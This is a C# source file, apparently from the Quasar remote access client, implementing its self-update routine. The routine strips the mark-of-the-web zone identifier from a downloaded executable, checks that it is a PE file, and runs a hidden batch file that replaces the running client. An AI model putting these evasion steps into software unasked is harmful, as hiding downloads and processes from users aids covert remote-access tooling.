using Quasar.Client.Config;
using Quasar.Client.Data;
using Quasar.Client.IO;
using Quasar.Client.Utilities;
using Quasar.Common.Helpers;
using Quasar.Common.Messages;
using System;
using System.Diagnostics;
using System.IO;

namespace Quasar.Client.Installation
{
    public static class ClientUpdater
    {
        public static void Update(Networking.Client client, string newFilePath)
        {
            try
            {
                FileHelper.DeleteZoneIdentifier(newFilePath);

                var bytes = File.ReadAllBytes(newFilePath);
                if (!FileHelper.HasExecutableIdentifier(bytes))
                    throw new Exception("no pe file");

                string batchFile = BatchFile.CreateUpdateBatch(ClientData.CurrentPath, newFilePath);

                if (string.IsNullOrEmpty(batchFile))
                    throw new Exception("Could not create update batch file.");

                ProcessStartInfo startInfo = new ProcessStartInfo
                {
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = true,
                    FileName = batchFile
                };
                Process.Start(startInfo);

                if (Settings.STARTUP)
                    Startup.RemoveFromStartup();

                Program.ConnectClient.Exit();
            }
            catch (Exception ex)
            {
                NativeMethods.DeleteFile(newFilePath);
                client.Send(new SetStatus {Message = $"Update failed: {ex.Message}"});
            }
        }
    }
}
